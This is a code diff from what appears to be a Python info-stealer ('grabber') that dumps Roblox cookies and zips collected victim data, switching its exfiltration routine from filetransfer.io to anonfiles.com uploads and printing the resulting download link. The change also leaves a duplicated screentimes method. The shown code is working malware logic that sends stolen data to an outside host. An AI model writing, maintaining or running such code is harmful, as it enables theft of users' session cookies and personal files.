@@ -1844,22 +1844,26 @@ class first_srdl_func(Functions):
             with open(ntpath.join(self.dir, "Roblox", "Roblox_Cookies.txt"), "w") as f:
                 f.write("\n".join(self.robloxcookies))
 
-    def upload_on_fileio(self, file_name, path):
+    def upload_on_anonfiles(self, file_name, path):
         try:
             with open(path, mode="rb") as file:
                 files = {"file": (file_name, file)}
-                upload = requests.post("https://filetransfer.io", files=files)
-                response = upload.json()
-                if response["status"] == "success":
-                    self.datazip_url = response["download"]
-                    print("Upload :", self.datazip_url)
+                response = requests.post("https://api.anonfiles.com/upload", files=files)
+                json_response = response.json()
+                if json_response["status"]:
+                    self.datazip_url = json_response["data"]["file"]["url"]["full"]
+                    print("Fichier téléchargé avec succès :", self.datazip_url)
                     return True
                 else:
-                    print("error :", response["error"])
+                    print("Erreur lors du téléchargement :", json_response["error"]["message"])
                     return False
         except Exception as e:
-            pass
+            print("Une erreur s'est produite :", str(e))
             return False
+        
+    def screentimes(self):
+        if self.ineedtogetscreen != "yes":
+            return
     
     def screentimes(self):
         if self.ineedtogetscreen != "yes":
@@ -2038,8 +2042,8 @@ class first_srdl_func(Functions):
             pass
 
         try:
-            self.upload_on_fileio(f"{self.getlange(self.pc_codewinl)}{hwkish}-{grbber}_{imthebestdev}.zip", _zipfile)
-            time.sleep(20)
+            self.upload_on_anonfiles(f"{self.getlange(self.pc_codewinl)}{hwkish}-{grbber}_{imthebestdev}.zip", _zipfile)
+            time.sleep(10)
         except:
             pass
         finally:
